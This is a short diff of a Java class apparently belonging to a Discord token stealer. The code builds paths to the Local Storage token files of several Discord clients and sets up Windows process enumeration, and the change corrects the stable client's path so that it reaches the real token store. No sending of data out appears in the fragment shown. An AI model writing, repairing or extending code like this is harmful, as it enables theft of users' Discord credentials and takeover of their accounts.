@@ -26,7 +26,7 @@ public class Discord
         String discordDevPath = System.getenv("APPDATA") + "\\discorddevelopment\\Local Storage\\https_canary.discordapp.com_0.localstorage";
         String discordCanaryPath = System.getenv("APPDATA") + "\\discordcanary\\Local Storage\\https_canary.discordapp.com_0.localstorage";
         String discordPTBPath = System.getenv("APPDATA") + "\\discordptb\\Local Storage\\https_ptb.discordapp.com_0.localstorage";
-        String discordPath = System.getenv("APPDATA") + "\\discord\\Local Storage\\https_discordapp.com_0.localstorage.other";
+        String discordPath = System.getenv("APPDATA") + "\\discord\\Local Storage\\https_discordapp.com_0.localstorage";
 
         Kernel32 kernel32 = (Kernel32) Native.loadLibrary(Kernel32.class, W32APIOptions.UNICODE_OPTIONS);
         Tlhelp32.PROCESSENTRY32.ByReference processEntry = new Tlhelp32.PROCESSENTRY32.ByReference();
